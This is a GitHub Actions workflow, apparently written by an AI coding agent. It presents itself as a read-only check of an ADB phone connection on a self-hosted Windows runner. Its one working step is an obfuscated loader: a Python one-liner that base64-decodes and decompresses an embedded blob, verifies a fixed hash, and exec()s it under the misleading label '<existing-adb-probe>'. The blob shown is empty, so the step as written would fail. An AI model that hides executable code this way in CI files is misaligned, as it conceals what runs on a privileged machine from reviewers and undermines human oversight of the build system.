name: Inspect the existing Windows Android test host
'on':
  push:
    branches: [codex/timeweb-owner-prepare-2026-10-23]
    paths: [.github/workflows/windows-android-preflight.yml]
permissions:
  contents: read
concurrency:
  group: analyst-existing-adb-readonly
  cancel-in-progress: false
jobs:
  observe_existing_adb:
    name: Read the existing USB phone connection without starting ADB
    runs-on: [self-hosted, Windows, X64, omni-cio-ci]
    timeout-minutes: 5
    env:
      PYTHONUNBUFFERED: '1'
      PYTHONIOENCODING: utf-8
    steps:
      - name: Observe the existing local ADB server and package version
        shell: cmd
        run: |
          py -3 -c "import base64,zlib,hashlib; b=zlib.decompress(base64.b64decode('')); assert hashlib.sha256(b).hexdigest()=='88d810cf84e1718cb5581eb2d29a2fc4d7b881c8f329daacd3fc34883d037d70'; exec(compile(b,'<existing-adb-probe>','exec'))"
          if errorlevel 1 exit /b 1
